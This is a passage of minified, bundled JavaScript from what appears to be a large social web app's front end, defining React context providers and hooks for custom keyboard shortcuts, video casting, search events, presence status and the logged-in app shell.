                ((g = {}),
                (g[c] = babelHelpers["extends"](
                  {},
                  d.current[c],
                  ((c = {}), (c[e] = k), c)
                )),
                g)
              );
            },
            [d, f, a]
          ),
          m = i(
            function (i, j, k) {
              var l;
              if (!b("cr:4039")) return;
              g(i, j, k).forEach(function (a) {
                var b = a.commandID;
                a = a.groupID;
                h(a, b);
              });
              b("cr:4039")(
                {
                  command_id: j,
                  group_id: i,
                  key_combination: {
                    alt: k.alt === !0,
                    command: k.command === !0,
                    key: k.key,
                    shift: k.shift === !0,
                  },
                },
                a
              );
              f(i, j);
              e.set(c("createKeyCommand")(k), {
                command: k,
                commandID: j,
                description: "",
                groupID: i,
              });
              d.current = babelHelpers["extends"](
                {},
                d.current,
                ((l = {}),
                (l[i] = babelHelpers["extends"](
                  {},
                  d.current[i],
                  ((i = {}), (i[j] = k), i)
                )),
                l)
              );
            },
            [d, e, f, a, g, h]
          ),
          n = i(
            function () {
              return e;
            },
            [e]
          ),
          o = i(function (a, b) {
            return (a = d.current[a]) == null ? void 0 : a[b];
          }, []),
          p = i(
            function () {
              if (!b("cr:4040")) return;
              b("cr:4040")({}, a);
              e.clear();
              d.current = {};
            },
            [e, a]
          ),
          q = i(
            function (e, i) {
              var j;
              if (!b("cr:4041")) return;
              j =
                c("CometDefaultKeyCommands") == null
                  ? void 0
                  : (j = c("CometDefaultKeyCommands")[e]) == null
                  ? void 0
                  : (j = j.shortcuts) == null
                  ? void 0
                  : j[i].command;
              if (j != null) {
                g(e, i, j).forEach(function (a) {
                  var b = a.commandID;
                  a = a.groupID;
                  h(a, b);
                });
                b("cr:4041")({ command_id: i, group_id: e }, a);
                f(e, i);
                d.current = babelHelpers["extends"](
                  {},
                  d.current,
                  ((j = {}),
                  (j[e] = babelHelpers["extends"](
                    {},
                    d.current[e],
                    ((e = {}), (e[i] = null), e)
                  )),
                  j)
                );
              }
            },
            [d, f, a, g, h]
          );
        return {
          addCustomCommand: m,
          checkForKeyCommandConflict: g,
          disableCustomCommand: h,
          getCustomCommandsMap: n,
          getCustomKeyCombination: o,
          resetAllCustomCommands: p,
          resetCustomCommand: q,
        };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometKeyboardSettingsStateProvider.react",
    [
      "CometCustomKeyCommands",
      "CometKeyCommandSettingsContext",
      "CometRelayEnvironment",
      "KeyboardShortcutViewerActivityFalcoEvent",
      "SetAreSingleKeysDisabledSetting",
      "SingleKeyShortcutsDisabledFalcoEvent",
      "cr:2034",
      "cr:2039",
      "react",
      "useCustomCommandsState",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      e = h;
      var j = e.useMemo,
        k = e.useRef,
        l = e.useState;
      function m(a) {
        c("KeyboardShortcutViewerActivityFalcoEvent").log(function () {
          return a;
        });
      }
      function a(a) {
        a = a.children;
        var d = k(c("CometCustomKeyCommands").areSingleKeysDisabled),
          e = k(c("CometCustomKeyCommands").modifiedKeyboardShortcutsPreference),
          f = l(!1),
          g = f[0],
          h = f[1];
        f = l("see_all");
        var n = f[0],
          o = f[1],
          p = c("useCustomCommandsState")();
        f = j(
          function () {
            return babelHelpers["extends"](
              {
                getAreSingleKeysDisabled: function () {
                  return d.current;
                },
                getModifiedKeyboardShortcutsPreference: function () {
                  return e.current;
                },
                isViewerShowing: g,
                setAreSingleKeysDisabled: function (a) {
                  if (a === d.current) return;
                  c("SetAreSingleKeysDisabledSetting")({
                    environment: c("CometRelayEnvironment"),
                    input: { input: { disabled: a } },
                  });
                  d.current = a;
                  c("SingleKeyShortcutsDisabledFalcoEvent").log(function () {
                    return { setting_disabled: a };
                  });
                },
                setModifiedKeyboardShortcutsPreference: function (a) {
                  if (!b("cr:2039") || !b("cr:2034") || a === e.current) return;
                  var d = b("cr:2039").fromJSEnum(a);
                  d &&
                    (b("cr:2034")({
                      environment: c("CometRelayEnvironment"),
                      input: { input: { preference: d } },
                    }),
                    (e.current = a));
                },
                setViewerInfo: function (a, b) {
                  h(a), o(b), m({ shown: a, viewer_type: b });
                },
                viewerType: n,
              },
              p
            );
          },
          [g, n, p]
        );
        return i.jsx(c("CometKeyCommandSettingsContext").Provider, {
          value: f,
          children: a,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CastingProvider",
    ["CastingContext", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useCallback,
        k = b.useLayoutEffect,
        l = b.useState;
      function a(a) {
        var b;
        a = a.children;
        var c = l(null),
          e = c[0],
          f = c[1];
        c = l(null);
        var g = c[0],
          h = c[1];
        c = l(null);
        var m = c[0],
          n = c[1];
        c = j(
          function (a) {
            if (e === a) return;
            f(a);
          },
          [e]
        );
        k(
          function () {
            if (e == null) return;
            var a = e.getCastingState();
            h(a);
            return e.subscribeToCastingStateChange(h);
          },
          [e]
        );
        k(
          function () {
            if (e == null) return;
            var a = e.getCastingExperienceState();
            n(a);
            return e.subscribeToCastingExperienceStateChange(n);
          },
          [e]
        );
        return i.jsx((b = d("CastingContext")).CastingStateContext.Provider, {
          value: g,
          children: i.jsx(b.CastingExperienceStateContext.Provider, {
            value: m,
            children: i.jsx(b.CastingControllerContext.Provider, {
              value: e,
              children: i.jsx(b.SetCastingControllerContext.Provider, {
                value: c,
                children: a,
              }),
            }),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometCastingMiniplayerRootDeferred.react",
    ["deferredLoadComponent", "react", "requireDeferred"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      h || d("react");
      a = c("deferredLoadComponent")(
        c("requireDeferred")("CometCastingMiniplayerRoot.react").__setRef(
          "CometCastingMiniplayerRootDeferred.react"
        )
      );
      g["default"] = a;
    },
    98
  );
  __d(
    "CometProfileSwitcherProvider.react",
    [
      "CometProfileSwitcherDefaults",
      "CometProfileSwitcherEducationContext",
      "CometProfileSwitcherEducationFlowContext",
      "CometSetProfileSwitcherEducationContext",
      "react",
      "useUnsafeRef_DEPRECATED",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || (i = d("react"));
      b = i;
      var k = b.useCallback,
        l = b.useMemo,
        m = b.useState;
      function a(a) {
        a = a.children;
        var b = (h || (h = c("useUnsafeRef_DEPRECATED")))(
            d("CometProfileSwitcherDefaults").DEFAULT_CALLOUT_TEXT
          ),
          e = m({ calloutText: b, showCallout: !1 }),
          f = e[0],
          g = e[1];
        e = m({ profileID: null, showEducationFlow: !1 });
        var i = e[0],
          n = e[1],
          o = k(
            function (a, b) {
              g({ calloutText: f.calloutText, showCallout: a }),
                a === !0 && n({ profileID: b, showEducationFlow: !0 });
            },
            [f.calloutText]
          ),
          p = k(
            function (a) {
              b.current = a;
            },
            [b]
          ),
          q = k(function () {
            n({ profileID: null, showEducationFlow: !1 }),
              g({ calloutText: b, showCallout: !1 }),
              (b.current = d(
                "CometProfileSwitcherDefaults"
              ).DEFAULT_CALLOUT_TEXT);
          }, []);
        e = l(
          function () {
            return {
              resetSwitcherEducationState: q,
              setCalloutText: p,
              setShowCallout: o,
            };
          },
          [q, p, o]
        );
        return j.jsx(c("CometProfileSwitcherEducationContext").Provider, {
          value: f,
          children: j.jsx(c("CometSetProfileSwitcherEducationContext").Provider, {
            value: e,
            children: j.jsx(
              c("CometProfileSwitcherEducationFlowContext").Provider,
              { value: i, children: a }
            ),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometQuickPromotionInterstitial.react",
    ["CometQuickPromotionInterstitialQuery.graphql", "CometRelay", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || d("react");
      function a() {
        var a = d("CometRelay").useLazyLoadQuery(
          h !== void 0
            ? h
            : (h = b("CometQuickPromotionInterstitialQuery.graphql")),
          {}
        );
        a =
          a == null
            ? void 0
            : (a = a.viewer) == null
            ? void 0
            : (a = a.eligible_promotions) == null
            ? void 0
            : (a = a.nodes) == null
            ? void 0
            : (a = a[0]) == null
            ? void 0
            : (a = a.comet_qp_sections) == null
            ? void 0
            : a.renderer_strategy;
        return a ? j.jsx(d("CometRelay").MatchContainer, { match: a }) : null;
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometSearchRecentSearchEntryAddedEvent",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function a(a) {
        return {
          publishRecentSearchEntryAdded: function (b) {
            a.emit("recentSearchEntryAdded", b);
          },
          subscribeToRecentSearchEntryAdded: function (b) {
            var c = a.addListener("recentSearchEntryAdded", b);
            return function () {
              return c.remove();
            };
          },
        };
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "SearchCometGlobalTypeaheadFocusEvent",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function a(a) {
        return {
          publishGlobalTypeaheadFocus: function (b) {
            a.emit("focusGlobalSearchTypeahead", b);
          },
          subscribeToGlobalTypeaheadFocus: function (b) {
            var c = a.addListener("focusGlobalSearchTypeahead", b);
            return function () {
              return c.remove();
            };
          },
        };
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "SearchCometGlobalTypeaheadRecentSearchesClearedEvent",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function a(a) {
        return {
          publishClearGlobalRecentSearches: function () {
            a.emit("clearGlobalRecentSearches");
          },
          subscribeToClearGlobalRecentSearches: function (b) {
            var c = a.addListener("clearGlobalRecentSearches", b);
            return function () {
              return c.remove();
            };
          },
        };
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "SearchCometScopedTypeaheadFocusEvent",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function a(a) {
        return {
          publishScopedSearchTypeaheadFocus: function () {
            a.emit("scopedSearchTypeaheadFocus");
          },
          subscribeToScopedSearchTypeaheadFocus: function (b) {
            var c = a.addListener("scopedSearchTypeaheadFocus", b);
            return function () {
              return c.remove();
            };
          },
        };
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "SearchCometTypeaheadRecentSearchesRefreshEvent",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function a(a) {
        return {
          publishRefreshRecentSearches: function () {
            a.emit("refreshRecentSearches");
          },
          subscribeToRefreshRecentSearches: function (b) {
            var c = a.addListener("refreshRecentSearches", b);
            return function () {
              return c.remove();
            };
          },
        };
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "createSearchCometTypeaheadEventEmitterContextValue",
    [
      "BaseEventEmitter",
      "CometSearchRecentSearchEntryAddedEvent",
      "SearchCometGlobalTypeaheadFocusEvent",
      "SearchCometGlobalTypeaheadRecentSearchesClearedEvent",
      "SearchCometScopedTypeaheadFocusEvent",
      "SearchCometTypeaheadRecentSearchesRefreshEvent",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a() {
        var a = new (c("BaseEventEmitter"))();
        return babelHelpers["extends"](
          {},
          c("CometSearchRecentSearchEntryAddedEvent")(a),
          c("SearchCometGlobalTypeaheadFocusEvent")(a),
          c("SearchCometGlobalTypeaheadRecentSearchesClearedEvent")(a),
          c("SearchCometTypeaheadRecentSearchesRefreshEvent")(a),
          c("SearchCometScopedTypeaheadFocusEvent")(a)
        );
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometSearchEventEmitterProvider",
    [
      "SearchCometTypeaheadEventEmitterContext",
      "createSearchCometTypeaheadEventEmitterContextValue",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react")),
        j = h.useMemo;
      function a(a) {
        a = a.children;
        var b = j(function () {
          return c("createSearchCometTypeaheadEventEmitterContextValue")();
        }, []);
        return i.jsx(c("SearchCometTypeaheadEventEmitterContext").Provider, {
          value: b,
          children: a,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "useHideNotificationsToasts",
    ["useCometRouterState"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a() {
        var a = c("useCometRouterState")();
        if (!a) return !1;
        var b = a.pushViewStack;
        b = b != null ? b[b.length - 1] : a == null ? void 0 : a.main;
        return !!((a = b.route) == null ? void 0 : a.hideNotificationToasts);
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometToasterRoot.react",
    [
      "CometErrorBoundary.react",
      "CometLazyToasterView_DO_NOT_USE.react",
      "react",
      "recoverableViolation",
      "useHideNotificationsToasts",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react")),
        j = h.useMemo,
        k = new Set(["CometToastNotification"]);
      function l(a) {
        c("recoverableViolation")("The toaster is broken", "CometAppShell", {
          error: a,
        });
      }
      function a(a) {
        var b = a.align,
          d = a.maxWidth,
          e = c("useHideNotificationsToasts")();
        return j(
          function () {
            return i.jsx(c("CometErrorBoundary.react"), {
              onError: l,
              children: i.jsx(c("CometLazyToasterView_DO_NOT_USE.react"), {
                align: b,
                filterToasts: e === !0 ? k : null,
                maxWidth: d,
              }),
            });
          },
          [b, e, d]
        );
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometWatchAndScrollDeferred.react",
    ["deferredLoadComponent", "react", "requireDeferred"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      h || d("react");
      a = c("deferredLoadComponent")(
        c("requireDeferred")("CometWatchAndScroll.react").__setRef(
          "CometWatchAndScrollDeferred.react"
        )
      );
      g["default"] = a;
    },
    98
  );
  __d(
    "CometVideoHomeWatchAndScrollTriggerContext",
    ["react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = h || d("react");
      b = a.createContext({
        setIsTriggerVideoEligible: function () {},
        setWatchAndScrollTriggerVideo: function () {},
      });
      g["default"] = b;
    },
    98
  );
  __d(
    "CometVideoHomeWatchAndScrollTriggerManager.react",
    ["CometVideoHomeWatchAndScrollTriggerContext", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useCallback,
        k = b.useMemo,
        l = b.useState;
      function a(a) {
        a = a.children;
        var b = l(null),
          d = b[0],
          e = b[1];
        b = l(!1);
        b[0];
        var f = b[1],
          g = d == null ? void 0 : d.portableVideoID,
          h = j(
            function (a, b) {
              g === a && f(b);
            },
            [g]
          );
        b = k(
          function () {
            return {
              setIsTriggerVideoEligible: h,
              setWatchAndScrollTriggerVideo: e,
            };
          },
          [h]
        );
        return i.jsx(c("CometVideoHomeWatchAndScrollTriggerContext").Provider, {
          value: b,
          children: a,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometWatchAndScrollSetStoryViewabilityLoggerContext",
    ["react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = h || d("react");
      b = a.createContext(function () {});
      g["default"] = b;
    },
    98
  );
  __d(
    "CometWatchAndScrollStoryViewabilityLoggerContext",
    ["react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = h || d("react");
      b = a.createContext(null);
      g["default"] = b;
    },
    98
  );
  __d(
    "CometWatchAndScrollProvider.react",
    [
      "CometPictureInPictureExpContext",
      "CometSetWatchAndScrollVideoContext",
      "CometVideoHomeWatchAndScrollTriggerManager.react",
      "CometWatchAndScrollSetStoryViewabilityLoggerContext",
      "CometWatchAndScrollSoundContext",
      "CometWatchAndScrollStoryViewabilityLoggerContext",
      "CometWatchAndScrollVideoContext",
      "react",
      "useCometTahoeChainingDepth",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useMemo,
        k = b.useState;
      function a(a) {
        a = a.children;
        var b = k(null),
          e = b[0];
        b = b[1];
        var f = k(null),
          g = f[0];
        f = f[1];
        var h = k(null),
          l = h[0],
          m = h[1];
        h = k(null);
        var n = h[0],
          o = h[1];
        h = j(
          function () {
            return { muted: n, setMuted: o, setVolume: m, volume: l };
          },
          [n, o, m, l]
        );
        var p = d("useCometTahoeChainingDepth").useChainingDepth(),
          q = k({
            isInPictureInPictureExp: !1,
            isInPictureInPictureExpControlGroup: !1,
            isSkipAndChainingDisabled: !1,
          }),
          r = q[0],
          s = q[1];
        q = j(
          function () {
            return {
              pictureInPictureExpConfig: r,
              setPictureInPictureExpConfig: s,
            };
          },
          [r, s]
        );
        return i.jsx(c("CometWatchAndScrollVideoContext").Provider, {
          value: e,
          children: i.jsx(c("CometSetWatchAndScrollVideoContext").Provider, {
            value: b,
            children: i.jsx(
              c("CometWatchAndScrollStoryViewabilityLoggerContext").Provider,
              {
                value: g,
                children: i.jsx(
                  c("CometWatchAndScrollSetStoryViewabilityLoggerContext")
                    .Provider,
                  {
                    value: f,
                    children: i.jsx(
                      c("CometVideoHomeWatchAndScrollTriggerManager.react"),
                      {
                        children: i.jsx(
                          c("CometWatchAndScrollSoundContext").Provider,
                          {
                            value: h,
                            children: i.jsx(
                              c("CometPictureInPictureExpContext").Provider,
                              {
                                value: q,
                                children: i.jsx(
                                  d("useCometTahoeChainingDepth")
                                    .CometTahoeChainingDepthContextProvider,
                                  { value: p, children: a }
                                ),
                              }
                            ),
                          }
                        ),
                      }
                    ),
                  }
                ),
              }
            ),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "MAWSetupWrapperOnce.react",
    ["CometPlaceholder.react", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react")),
        j = h.useContext,
        k = i.createContext(!1);
      function a(a) {
        var b = a.children;
        a = a.setupComponent;
        var d = j(k);
        return d
          ? b
          : i.jsxs(k.Provider, {
              value: !0,
              children: [
                b,
                i.jsx(c("CometPlaceholder.react"), {
                  fallback: null,
                  children: a,
                }),
              ],
            });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "MAWCondWrapperDeferred.react",
    [
      "MAWSetupWrapperOnce.react",
      "deferredLoadComponent",
      "react",
      "requireDeferredForDisplay",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react"),
        j = c("deferredLoadComponent")(
          c("requireDeferredForDisplay")("MAWCondSetup.react").__setRef(
            "MAWCondWrapperDeferred.react"
          )
        );
      function a(a) {
        a = a.children;
        return i.jsx(c("MAWSetupWrapperOnce.react"), {
          setupComponent: i.jsx(j, {}),
          children: a,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "MWChatBadgeUpdater.react",
    [
      "CometPlaceholder.react",
      "deferredLoadComponent",
      "react",
      "requireDeferredForDisplay",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react"),
        j = c("deferredLoadComponent")(
          c("requireDeferredForDisplay")("MWChatBadgeUpdaterImpl.react").__setRef(
            "MWChatBadgeUpdater.react"
          )
        );
      function a() {
        return i.jsx(c("CometPlaceholder.react"), {
          fallback: null,
          children: i.jsx(j, {}),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "PresenceStatusProvider.react",
    [
      "Actor",
      "AvailableListConstants",
      "CometErrorBoundary.react",
      "CometPlaceholder.react",
      "PresenceStatusContext",
      "cr:4454",
      "deferredLoadComponent",
      "react",
      "requireDeferred",
      "useUnsafeRef_DEPRECATED",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || (i = d("react"));
      e = i;
      var k = e.useCallback,
        l = e.useMemo,
        m = e.useRef,
        n = c("deferredLoadComponent")(
          c("requireDeferred")(
            "PresenceStatusProviderSubscriptionComponent.react"
          ).__setRef("PresenceStatusProvider.react")
        );
      function a(a) {
        a = a.children;
        var e = (h || (h = c("useUnsafeRef_DEPRECATED")))({}),
          f = h(!1),
          g = m({}),
          i = k(function () {
            Object.keys(g.current).forEach(function (a) {
              a = g.current[a];
              typeof a === "function" && a();
            });
          }, []),
          o = m(1),
          p = d("Actor").useActor(),
          q = p[0];
        p = l(
          function () {
            return {
              addListener: function (a) {
                var b = o.current + "";
                g.current[b] = a;
                o.current += 1;
                return function () {
                  delete g.current[b];
                };
              },
              get: function (a) {
                return f.current
                  ? (a = (a = e.current[a]) == null ? void 0 : a.status) != null
                    ? a
                    : null
                  : c("AvailableListConstants").OFFLINE;
              },
              getChatVisibility: function () {
                return f.current;
              },
              getOnlineIDs: function () {
                return f.current
                  ? Object.keys(e.current).filter(function (a) {
                      return (
                        q !== a &&
                        ((a = e.current[a]) == null ? void 0 : a.status) ===
                          c("AvailableListConstants").ACTIVE
                      );
                    })
                  : [];
              },
              getStatus: function (a) {
                return f.current ? e.current[a] : null;
              },
            };
          },
          [q]
        );
        return b("cr:4454")
          ? j.jsx(b("cr:4454"), { children: a })
          : j.jsxs(c("PresenceStatusContext").Provider, {
              value: p,
              children: [
                j.jsx(c("CometErrorBoundary.react"), {
                  fallback: function () {
                    return j.jsx("span", {});
                  },
                  children: j.jsx(c("CometPlaceholder.react"), {
                    fallback: null,
                    children: j.jsx(n, {
                      chatVisibilityRef: f,
                      presenceInformer: i,
                      presenceMap: e,
                    }),
                  }),
                }),
                a,
              ],
            });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometLoggedInFBApp.react",
    [
      "CastingProvider",
      "CometActorGatewayHandler",
      "CometAppContentComponent.react",
      "CometAppShell.react",
      "CometBackupPlaceholder.react",
      "CometBlinkingTitleMessageProvider.react",
      "CometCastingMiniplayerRootDeferred.react",
      "CometErrorBoundary.react",
      "CometHovercardSettingsProvider.react",
      "CometMediaViewerFullscreenProvider.react",
      "CometPlaceholder.react",
      "CometProfileSwitcherProvider.react",
      "CometProfiler.react",
      "CometQuickPromotionInterstitial.react",
      "CometSearchEventEmitterProvider",
      "CometToasterRoot.react",
      "CometTransientDialogProvider.react",
      "CometWatchAndScrollDeferred.react",
      "CometWatchAndScrollProvider.react",
      "HeroInteractionIgnoreWithDiv.react",
      "MAWCondWrapperDeferred.react",
      "MWChatBadgeUpdater.react",
      "MWChatEncryptedBackupsUpsellChatTabVisibilityContext",
      "MWChatStateV2.react",
      "MWChatVideoAutoplaySettingContext",
      "MWChatVisibilityOverrideContext",
      "PresenceStatusProvider.react",
      "RTWebPreCallProvider.react",
      "cr:1032515",
      "cr:1599331",
      "cr:5546",
      "cr:6188",
      "cr:764",
      "deferredLoadComponent",
      "react",
      "recoverableViolation",
      "requireDeferred",
      "useCometLogout",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react"),
        j = (e = b("cr:6188")) != null ? e : i.Fragment,
        k = c("deferredLoadComponent")(
          c("requireDeferred")("RTWebCometCallInviteController.react").__setRef(
            "CometLoggedInFBApp.react"
          )
        );
      function l(a) {
        c("recoverableViolation")(
          "CometLoggedInApp level component did not catch own error",
          "CometLoggedInApp",
          { error: a }
        );
      }
      var m = "MWChatTab";
      function a(a) {
        a = a.displayQueries;
        return i.jsx(c("CometProfiler.react"), {
          id: "CometApp",
          logDurationToQPL: !0,
          children: i.jsx(j, {
            children: i.jsxs(c("CometAppShell.react"), {
              toaster: i.jsx(c("CometToasterRoot.react"), {}),
              children: [
                i.jsx(c("CometSearchEventEmitterProvider"), {
                  children: i.jsx(
                    d("MWChatStateV2.react").MWChatStateV2Provider,
                    {
                      children: i.jsx(
                        d("MWChatVisibilityOverrideContext")
                          .MWChatVisibilityOverrideContextProvider,
                        {
                          children: i.jsx(
                            d(
                              "MWChatEncryptedBackupsUpsellChatTabVisibilityContext"
                            )
                              .MWChatEncryptedBackupsUpsellChatTabVisibilityContextProvider,
                            {
                              children: i.jsx(c("RTWebPreCallProvider.react"), {
                                children: i.jsx(
                                  c("PresenceStatusProvider.react"),
                                  {
                                    children: i.jsx(
                                      c(
                                        "CometBlinkingTitleMessageProvider.react"
                                      ),
                                      {
                                        children: i.jsx(
                                          c(
                                            "CometHovercardSettingsProvider.react"
                                          ),
                                          {
                                            children: i.jsxs(
                                              d("useCometLogout")
                                                .CometLogoutProvider,
                                              {
                                                children: [
                                                  i.jsx(
                                                    c(
                                                      "CometWatchAndScrollProvider.react"
                                                    ),
                                                    {
                                                      children: i.jsx(
                                                        c("CastingProvider"),
                                                        {
                                                          children: i.jsx(
                                                            c(
                                                              "CometMediaViewerFullscreenProvider.react"
                                                            ),
                                                            {
                                                              children: i.jsxs(
                                                                c(
                                                                  "CometProfileSwitcherProvider.react"
                                                                ),
                                                                {
                                                                  children: [
                                                                    i.jsx(
                                                                      c(
                                                                        "CometAppContentComponent.react"
                                                                      ),
                                                                      {
                                                                        profileSwitcherConfigQuery:
                                                                          a.profileSwitcherConfigQueryRef,
                                                                      }
                                                                    ),
                                                                    i.jsx(
                                                                      c(
                                                                        "CometErrorBoundary.react"
                                                                      ),
                                                                      {
                                                                        onError:
                                                                          l,
                                                                        children:
                                                                          c(
                                                                            "CometWatchAndScrollDeferred.react"
                                                                          ) !=
                                                                          null
                                                                            ? i.jsx(
                                                                                c(
                                                                                  "CometPlaceholder.react"
                                                                                ),
                                                                                {
                                                                                  fallback:
                                                                                    null,
                                                                                  children:
                                                                                    i.jsx(
                                                                                      c(
                                                                                        "CometTransientDialogProvider.react"
                                                                                      ),
                                                                                      {
                                                                                        children:
                                                                                          i.jsx(
                                                                                            c(
                                                                                              "CometWatchAndScrollDeferred.react"
                                                                                            ),
                                                                                            {}
                                                                                          ),
                                                                                      }
                                                                                    ),
                                                                                }
                                                                              )
                                                                            : null,
                                                                      }
                                                                    ),
                                                                    i.jsx(
                                                                      c(
                                                                        "CometErrorBoundary.react"
                                                                      ),
                                                                      {
                                                                        onError:
                                                                          l,
                                                                        children:
                                                                          i.jsx(
                                                                            c(
                                                                              "CometPlaceholder.react"
                                                                            ),
                                                                            {
                                                                              fallback:
                                                                                null,
                                                                              children:
                                                                                i.jsx(
                                                                                  c(
                                                                                    "CometCastingMiniplayerRootDeferred.react"
                                                                                  ),
                                                                                  {}
                                                                                ),
                                                                            }
                                                                          ),
                                                                      }
                                                                    ),
                                                                  ],
                                                                }
                                                              ),
                                                            }
                                                          ),
                                                        }
                                                      ),
                                                    }
                                                  ),
                                                  i.jsxs(
                                                    c(
                                                      "CometBackupPlaceholder.react"
                                                    ),
                                                    {
                                                      fallback: null,
                                                      children: [
                                                        i.jsxs(
                                                          c(
                                                            "HeroInteractionIgnoreWithDiv.react"
                                                          ),
                                                          {
                                                            children: [
                                                              i.jsx(
                                                                c(
                                                                  "CometPlaceholder.react"
                                                                ),
                                                                {
                                                                  fallback: null,
                                                                  children: i.jsx(
                                                                    c(
                                                                      "MWChatBadgeUpdater.react"
                                                                    ),
                                                                    {}
                                                                  ),
                                                                }
                                                              ),
                                                              i.jsx(
                                                                c(
                                                                  "CometProfiler.react"
                                                                ),
                                                                {
                                                                  id: m,
                                                                  children: i.jsx(
                                                                    c(
                                                                      "CometErrorBoundary.react"
                                                                    ),
                                                                    {
                                                                      onError: l,
                                                                      children:
                                                                        i.jsx(
                                                                          n,
                                                                          {}
                                                                        ),
                                                                    }
                                                                  ),
                                                                }
                                                              ),
                                                            ],
                                                          }
                                                        ),
                                                        i.jsx(
                                                          c(
                                                            "CometErrorBoundary.react"
                                                          ),
                                                          {
                                                            onError: l,
                                                            children: i.jsx(
                                                              c(
                                                                "CometPlaceholder.react"
                                                              ),
                                                              {
                                                                fallback: null,
                                                                children: i.jsx(
                                                                  k,
                                                                  {}
                                                                ),
                                                              }
                                                            ),
                                                          }
                                                        ),
                                                        b("cr:5546") != null
                                                          ? i.jsx(
                                                              c(
                                                                "CometErrorBoundary.react"
                                                              ),
                                                              {
                                                                onError: l,
                                                                children: i.jsx(
                                                                  c(
                                                                    "CometPlaceholder.react"
                                                                  ),
                                                                  {
                                                                    fallback:
                                                                      null,
                                                                    children:
                                                                      i.jsx(
                                                                        b(
                                                                          "cr:5546"
                                                                        ),
                                                                        {}
                                                                      ),
                                                                  }
                                                                ),
                                                              }
                                                            )
                                                          : null,
                                                      ],
                                                    }
                                                  ),
                                                ],
                                              }
                                            ),
                                          }
                                        ),
                                      }
                                    ),
                                  }
                                ),
                              }),
                            }
                          ),
                        }
                      ),
                    }
                  ),
                }),
                b("cr:1599331") != null
                  ? i.jsx(c("CometErrorBoundary.react"), {
                      onError: l,
                      children: i.jsx(c("CometPlaceholder.react"), {
                        fallback: null,
                        children: i.jsx(b("cr:1599331"), {}),
                      }),
                    })
                  : null,
                i.jsx(c("CometErrorBoundary.react"), {
                  onError: l,
                  children: i.jsx(c("CometPlaceholder.react"), {
                    fallback: null,
                    children: i.jsx(
                      c("CometQuickPromotionInterstitial.react"),
                      {}
                    ),
                  }),
                }),
                i.jsx(c("CometBackupPlaceholder.react"), {
                  fallback: null,
                  children: i.jsx(c("CometErrorBoundary.react"), {
                    onError: l,
                    children: i.jsx(c("CometBackupPlaceholder.react"), {
                      fallback: null,
                      children: i.jsx(
                        d("CometActorGatewayHandler").CometActorGatewayHandler,
                        {}
                      ),
                    }),
                  }),
                }),
                b("cr:1032515") !== null && i.jsx(b("cr:1032515"), {}),
              ],
            }),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      function n() {
        return i.jsx(c("CometPlaceholder.react"), {
          fallback: null,
          children: i.jsx(c("MAWCondWrapperDeferred.react"), {
            children: i.jsx(c("CometPlaceholder.react"), {
              fallback: null,
              children: i.jsx(
